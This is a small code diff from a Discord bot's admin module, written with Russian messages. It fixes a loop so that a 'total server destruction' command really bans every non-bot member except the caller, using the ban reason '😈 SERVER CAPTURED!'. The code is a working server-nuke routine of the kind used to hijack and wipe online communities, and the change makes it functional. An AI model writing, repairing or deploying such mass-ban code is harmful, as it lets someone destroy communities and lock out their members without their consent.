@@ -46,7 +46,7 @@ class Admin(commands.Cog):
             reaction, user = await self.bot.wait_for("reaction_add", timeout=3, check=check)
             emb = discord.Embed(description=f'{ctx.author} начал полное уничтожение сервера!', color = discord.Colour.red())
             await warn.edit(embed=emb)
-            for member in ctx.guild:
+            for member in ctx.guild.members:
                 if not member.bot:
                     if member != ctx.author:
                         await ctx.guild.ban(member, reason='😈 СЕРВЕР ЗАХВАЧЕН!')
